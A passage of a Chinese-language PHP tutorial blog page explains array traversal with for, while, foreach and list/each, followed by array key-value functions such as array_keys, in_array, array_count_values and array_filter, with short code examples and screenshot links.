class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20221117204227.png" /></p>
<h1 id="数组的遍历">3. 数组的遍历</h1>
<h2 id="for-循环遍历">3.1. <code>for</code> 循环遍历</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$arr</span> = range(<span class="number">1</span>, <span class="number">10</span>); <span class="comment"># 生成[1, 10]的整数数组</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span>&lt;count(<span class="variable">$arr</span>); <span class="variable">$i</span>++)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;第&#x27;</span>.<span class="variable">$i</span>.<span class="string">&#x27;个元素是&#x27;</span>.<span class="variable">$arr</span>[<span class="variable">$i</span>].<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20221117204857.png" /></p>
<p>这里需要注意，<code>range(start, end, dist)</code> 与 Python
中的不同，这里是左右都是闭区间。<code>count()</code>
函数用来计算数组的长度。</p>
<p>上面是遍历索引数组，那怎么遍历关联数组呢？因为关联数组的键不是整数，所以无法使用
<code>$arr[$i]</code>，那就使用上一节的数组指针来遍历。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$arr</span> = [<span class="string">&#x27;name&#x27;</span>=&gt;<span class="string">&#x27;petter&#x27;</span>, <span class="string">&#x27;age&#x27;</span>=&gt;<span class="number">28</span>, <span class="string">&#x27;city&#x27;</span>=&gt;<span class="string">&#x27;beijing&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; count(<span class="variable">$arr</span>); <span class="variable">$i</span>++)&#123;</span><br><span class="line">    <span class="keyword">echo</span> key(<span class="variable">$arr</span>).<span class="string">&#x27; =&gt; &#x27;</span>.current(<span class="variable">$arr</span>).<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">    next(<span class="variable">$arr</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20221117205217.png" /></p>
<h2 id="while-循环遍历">3.2. <code>while</code> 循环遍历</h2>
<p>索引数组：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$arr</span> = range(<span class="number">1</span>, <span class="number">10</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$i</span> = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (<span class="variable">$i</span> &lt; count(<span class="variable">$arr</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;第&#x27;</span>.<span class="variable">$i</span>.<span class="string">&#x27;个元素是&#x27;</span>.<span class="variable">$arr</span>[<span class="variable">$i</span>].<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">    <span class="variable">$i</span>++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20221117205548.png" /></p>
<p>关联数组：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$arr</span> = [<span class="string">&#x27;name&#x27;</span>=&gt;<span class="string">&#x27;petter&#x27;</span>, <span class="string">&#x27;age&#x27;</span>=&gt;<span class="number">28</span>, <span class="string">&#x27;city&#x27;</span>=&gt;<span class="string">&#x27;beijing&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$i</span> = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (<span class="variable">$i</span> &lt; count(<span class="variable">$arr</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> key(<span class="variable">$arr</span>).<span class="string">&#x27; =&gt; &#x27;</span>.current(<span class="variable">$arr</span>).<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">    next(<span class="variable">$arr</span>);</span><br><span class="line">    <span class="variable">$i</span>++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20221117205633.png" /></p>
<h2 id="foreach-循环遍历-最常用">3.3. <code>foreach</code> 循环遍历
（最常用）</h2>
<p>语法：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">foreach</span> (<span class="variable">$arr</span> <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$val</span>)&#123;</span><br><span class="line">	...;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上述语句中遍历数组 <code>$arr</code>，每次从 <code>$arr</code>
中取出一个元素，然后把键赋值给 <code>$key</code>，把值赋值给
<code>$val</code>，类似于 Python 中的
<code>for key, val in enumerate(lst)</code> 或者
<code>for key, val in d.items()</code>。</p>
<p>索引数组：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$arr</span> = [<span class="number">1</span> =&gt; <span class="number">23</span>, <span class="number">2</span> =&gt; <span class="string">&#x27;takagi&#x27;</span>, <span class="number">3</span> =&gt; <span class="number">3</span>, <span class="number">5</span> =&gt; <span class="number">5</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$arr</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$val</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$key</span>.<span class="string">&#x27; =&gt; &#x27;</span>.<span class="variable">$val</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20221117210612.png" /></p>
<p>关联数组（：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$arr</span> = [<span class="string">&#x27;name&#x27;</span>=&gt;<span class="string">&#x27;petter&#x27;</span>, <span class="string">&#x27;age&#x27;</span>=&gt;<span class="number">28</span>, <span class="string">&#x27;city&#x27;</span>=&gt;<span class="string">&#x27;beijing&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$arr</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$val</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$key</span>.<span class="string">&#x27; =&gt; &#x27;</span>.<span class="variable">$val</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20221117210511.png" /></p>
<h2 id="list-与-each-函数配合">3.4. <code>list</code> 与
<code>each</code> 函数配合</h2>
<p><code>list</code>
是语句不是函数，主要功能：将数组元素转为变量。需要满足以下条件：</p>
<ol type="1">
<li>数组的键名必须是默认从 0 开始递增的索引数组；</li>
<li><code>list</code>
的参数，不一定要和数组一一对应，不对应的变量就自动忽略；</li>
</ol>
<p>举个例子：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$arr</span> = range(<span class="number">1</span>, <span class="number">5</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">list</span>(<span class="variable">$a</span>, <span class="variable">$b</span>, <span class="variable">$c</span>, , <span class="variable">$e</span>) = <span class="variable">$arr</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>.<span class="string">&#x27;, &#x27;</span>.<span class="variable">$b</span>.<span class="string">&#x27;, &#x27;</span>.<span class="variable">$c</span>.<span class="string">&#x27;, &#x27;</span>.<span class="variable">$e</span>;</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20221117211226.png" /></p>
<p><code>list</code> 中少了第四个参数，所以生成的变量会忽略数组中的
4。</p>
<p><code>each()</code>
函数：返回数组中当前的键／值对并将数组指针向后移动一步。</p>
<blockquote>
<p><strong>警告</strong>：本函数已自 PHP 7.2.0 起被 <em>废弃</em>，并自
PHP 8.0.0 起被 <em>移除</em>。强烈建议不要依赖本函数。</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$arr</span> = [<span class="string">&#x27;beijing&#x27;</span>, <span class="string">&#x27;fuzhou&#x27;</span>, <span class="string">&#x27;xian&#x27;</span>];</span><br><span class="line"></span><br><span class="line">reset(<span class="variable">$arr</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line">print_r(each(<span class="variable">$arr</span>));</span><br><span class="line">print_r(each(<span class="variable">$arr</span>));</span><br><span class="line">print_r(each(<span class="variable">$arr</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20221117211936.png" /></p>
<p>从结果可以看到，<code>each()</code> 返回的是一个数组，其中有 4
个元素，其中<strong>两两成一对</strong>：</p>
<ol type="1">
<li>键名为 0 和 1 的构成 <strong>索引表示</strong>，键名为 0
的值为索引的值，键名为 1 的值是元素的值；</li>
<li>键名为 <code>key</code> 和 <code>value</code> 构成
<strong>关联表示</strong>，键名为 <code>key</code>
的值为索引的值，键名为 <code>value</code> 的值是元素的值；</li>
</ol>
<p>这是为了方便 <code>list</code> 处理，因为 <code>list</code>
只能处理索引数组。<strong><code>each()</code>
可以遍历任何数组</strong>。</p>
<p>两者配合完成遍历：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$arr</span> = [<span class="string">&#x27;name&#x27;</span>=&gt;<span class="string">&#x27;petter&#x27;</span>, <span class="string">&#x27;age&#x27;</span>=&gt;<span class="number">28</span>, <span class="string">&#x27;city&#x27;</span>=&gt;<span class="string">&#x27;beijing&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="keyword">list</span>(<span class="variable">$key</span>, <span class="variable">$val</span>) = each(<span class="variable">$arr</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$key</span>.<span class="string">&#x27; =&gt; &#x27;</span>.<span class="variable">$val</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20221117213016.png" /></p>
<p>解释：</p>
<ul>
<li><code>each($arr)</code> ，会将某个键值对以数组形式返回，数组中有 4
个元素；</li>
<li>因为 <code>list($key, $val)</code> 只遍历索引数组，所以会忽略键名为
<code>key</code> 和 <code>value</code>；</li>
<li>并且 <code>list($key, $val)</code>
是根据索引递增赋值，所以会把键名为 0 的值赋值给
<code>$key</code>，把键名为 1 的值赋值给 <code>$val</code>；</li>
</ul>
<h2 id="遍历方式选择">3.5. 遍历方式选择</h2>
<ol type="1">
<li>默认索引数组使用 <code>for</code>；</li>
<li>自定义关联数组使用 <code>foreach</code>；</li>
</ol>
<h1 id="数组的键值操作">4. 数组的键值操作</h1>
<ol type="1">
<li><strong><code>array_values($arr)</code>
：将当前数组元素的值，全部取出后重新打包到一个默认的索引数组（索引从 0
开始递增）中。</strong></li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$arr</span> = [<span class="string">&#x27;name&#x27;</span>=&gt;<span class="string">&#x27;petter&#x27;</span>, <span class="string">&#x27;age&#x27;</span>=&gt;<span class="number">28</span>, <span class="string">&#x27;city&#x27;</span>=&gt;<span class="string">&#x27;beijing&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line">print_r(<span class="variable">$arr</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$arr1</span> = array_values(<span class="variable">$arr</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line">print_r(<span class="variable">$arr1</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20221117213659.png" /></p>
<p>场景：</p>
<ul>
<li>只需要对数组元素的值感兴趣的场合，比如大量数据的搜索。</li>
</ul>
<hr />
<ol start="2" type="1">
<li><strong><code>array_keys($arr)</code>
：将数组的键名打包到一个默认索引数组中；</strong></li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$arr</span> = [<span class="string">&#x27;name&#x27;</span>=&gt;<span class="string">&#x27;petter&#x27;</span>, <span class="string">&#x27;age&#x27;</span>=&gt;<span class="number">28</span>, <span class="string">&#x27;city&#x27;</span>=&gt;<span class="string">&#x27;beijing&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line">print_r(<span class="variable">$arr</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$arr1</span> = array_keys(<span class="variable">$arr</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line">print_r(<span class="variable">$arr1</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; count(<span class="variable">$arr1</span>); <span class="variable">$i</span>++)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;我的&#x27;</span>.<span class="variable">$arr1</span>[<span class="variable">$i</span>].<span class="string">&#x27;是&#x27;</span>.<span class="variable">$arr</span>[<span class="variable">$arr1</span>[<span class="variable">$i</span>]].<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20221118111418.png" /></p>
<p>与 <code>array_values()</code>
类似，将数组中的键名当做新的默认索引数组的值。</p>
<hr />
<ol start="3" type="1">
<li><strong><code>array_key_exists($key, $arr)</code>
：检测键名是否存在于数组。</strong></li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$arr</span> = [<span class="string">&#x27;name&#x27;</span>=&gt;<span class="string">&#x27;petter&#x27;</span>, <span class="string">&#x27;age&#x27;</span>=&gt;<span class="number">28</span>, <span class="string">&#x27;city&#x27;</span>=&gt;<span class="string">&#x27;beijing&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line">print_r(<span class="variable">$arr</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$r1</span> = array_key_exists(<span class="string">&#x27;age&#x27;</span>, <span class="variable">$arr</span>);</span><br><span class="line">var_dump(<span class="variable">$r1</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$r2</span> = array_key_exists(<span class="string">&#x27;id&#x27;</span>, <span class="variable">$arr</span>);</span><br><span class="line">var_dump(<span class="variable">$r2</span>);</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20221118111812.png" /></p>
<hr />
<ol start="4" type="1">
<li><strong><code>in_array($val, $arr[, true])</code> 与
<code>array_search($val, $arr[, true])</code>
：查询数组中是否存在某个值；</strong></li>
</ol>
<p><code>in_array($val, $arr[, true])</code>
：第一个参数是要查询的值，第二个参数是要查询的目标数组，第三个参数是一个开关，是否开启严格模式，如果开启，则
<strong>值与类型</strong> 都需要匹配。返回值为布尔类型。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$arr</span> = [<span class="string">&#x27;name&#x27;</span>=&gt;<span class="string">&#x27;petter&#x27;</span>, <span class="string">&#x27;age&#x27;</span>=&gt;<span class="number">28</span>, <span class="string">&#x27;city&#x27;</span>=&gt;<span class="string">&#x27;beijing&#x27;</span>];</span><br><span class="line"><span class="variable">$r1</span> = in_array(<span class="string">&#x27;28&#x27;</span>, <span class="variable">$arr</span>, <span class="literal">true</span>);</span><br><span class="line"><span class="variable">$r2</span> = in_array(<span class="string">&#x27;28&#x27;</span>, <span class="variable">$arr</span>, <span class="literal">false</span>);</span><br><span class="line"><span class="variable">$r3</span> = in_array(<span class="string">&#x27;28&#x27;</span>, <span class="variable">$arr</span>);</span><br><span class="line"></span><br><span class="line">var_dump(<span class="variable">$r1</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">var_dump(<span class="variable">$r2</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">var_dump(<span class="variable">$r3</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20221118112626.png" /></p>
<p>开启严格模式的话（默认开启），由于类型不匹配（字符串和整数），所以返回
false，否则返回 true。</p>
<p><code>array_search($val, $arr[, true])</code>
：在数组中搜索指定值，找到则返回键名，没找到返回 <code>false</code>。
支持 true 参数。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$arr</span> = [<span class="string">&#x27;name&#x27;</span>=&gt;<span class="string">&#x27;petter&#x27;</span>, <span class="string">&#x27;age&#x27;</span>=&gt;<span class="number">28</span>, <span class="string">&#x27;city&#x27;</span>=&gt;<span class="string">&#x27;beijing&#x27;</span>];</span><br><span class="line"><span class="variable">$r1</span> = array_search(<span class="string">&#x27;28&#x27;</span>, <span class="variable">$arr</span>, <span class="literal">true</span>);</span><br><span class="line"><span class="variable">$r2</span> = array_search(<span class="string">&#x27;28&#x27;</span>, <span class="variable">$arr</span>, <span class="literal">false</span>);</span><br><span class="line"><span class="variable">$r3</span> = array_search(<span class="string">&#x27;28&#x27;</span>, <span class="variable">$arr</span>);</span><br><span class="line"></span><br><span class="line">var_dump(<span class="variable">$r1</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">var_dump(<span class="variable">$r2</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">var_dump(<span class="variable">$r3</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20221118112951.png" /></p>
<p>默认不开启严格模式，即默认为 <code>false</code>。</p>
<hr />
<ol start="5" type="1">
<li><strong>数组统计类函数</strong>：
<ol type="1">
<li><code>count($arr[, 0/1])</code> ：统计数组元素数量，如果第二参数为
1，则会递归统计多维数组，如果第二参数为 0，则只统计第一层数组的个数
（默认为 0）；</li>
<li><code>array_count_values($arr)</code>
：返回数组中每个值出现的次数，返回关联数组，键是原数组中的值，值是出现的次数，只会统计数组值是整数或字符串的元素（因为这些会成为返回的关联数组的键）；</li>
<li><code>array_unique($arr)</code> ：删除数组中重复的值；</li>
<li>...</li>
</ol></li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$arr</span> = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, [<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, [<span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>]]];</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line">print_r(<span class="variable">$arr</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;0 mode: &#x27;</span>.count(<span class="variable">$arr</span>).<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;1 mode: &#x27;</span>.count(<span class="variable">$arr</span>, <span class="number">1</span>).<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20221118113422.png" /></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$arr</span> = [<span class="string">&#x27;name&#x27;</span>=&gt;<span class="string">&#x27;petter&#x27;</span>, <span class="string">&#x27;age&#x27;</span>=&gt;<span class="number">28</span>, <span class="string">&#x27;city&#x27;</span>=&gt;<span class="string">&#x27;beijing&#x27;</span>, <span class="string">&#x27;id&#x27;</span> =&gt; <span class="number">28</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line">print_r(<span class="variable">$arr</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$count_arr</span> = array_count_values(<span class="variable">$arr</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line">print_r(<span class="variable">$count_arr</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20221118113825.png" /></p>
<p>如果值有小数，则：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$arr</span> = [<span class="string">&#x27;name&#x27;</span>=&gt;<span class="string">&#x27;petter&#x27;</span>, <span class="string">&#x27;age&#x27;</span>=&gt;<span class="number">28</span>, <span class="string">&#x27;city&#x27;</span>=&gt;<span class="string">&#x27;beijing&#x27;</span>, <span class="string">&#x27;id&#x27;</span> =&gt; <span class="number">28.3</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line">print_r(<span class="variable">$arr</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$count_arr</span> = array_count_values(<span class="variable">$arr</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line">print_r(<span class="variable">$count_arr</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20221118113907.png" /></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$arr</span> = [<span class="string">&#x27;a&#x27;</span> =&gt; <span class="string">&#x27;html&#x27;</span>, <span class="string">&#x27;b&#x27;</span> =&gt; <span class="string">&#x27;css&#x27;</span>, <span class="string">&#x27;c&#x27;</span> =&gt; <span class="string">&#x27;php&#x27;</span>, <span class="string">&#x27;d&#x27;</span> =&gt; <span class="string">&#x27;php&#x27;</span>, <span class="string">&#x27;e&#x27;</span> =&gt; <span class="string">&#x27;css&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line">print_r(<span class="variable">$arr</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;$arr数组元素个数是:&#x27;</span>.count(<span class="variable">$arr</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$new_arr</span> = array_unique(<span class="variable">$arr</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line">print_r(<span class="variable">$new_arr</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;$new_arr数组元素个数是:&#x27;</span>.count(<span class="variable">$new_arr</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20221118114239.png" /></p>
<hr />
<ol start="6" type="1">
<li><strong><code>array_filter($arr, callback)</code>
数组过滤器函数：使用回调函数处理数组元素的值，将数组元素依次传入
callback 中处理；</strong></li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$arr</span> = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span> , <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">odd</span>(<span class="params"><span class="variable">$n</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$n</span> &amp; <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">even</span>(<span class="params"><span class="variable">$n</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> !(<span class="variable">$n</span> &amp; <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$arr1</span> = array_filter(<span class="variable">$arr</span>, <span class="string">&#x27;odd&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line">print_r(<span class="variable">$arr1</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$arr2</span> = array_filter(<span class="variable">$arr</span>, <span class="string">&#x27;even&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line">print_r(<span class="variable">$arr2</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20221118160752.png" /></p>
<p>可以看到，经过 <code>array_filter()</code>
的数组只会剩下满足回调函数返回值为 1 的元素。返回值是一个数组。</p>
<hr />
<ol start="7" type="1">
<li><strong><code>array_walk($arr, callback)</code>
：将数组中的键值对依次传入 callback 处理；</strong>
<ol type="1">
<li>更新数组；</li>
<li>遍历元素；</li>
</ol></li>
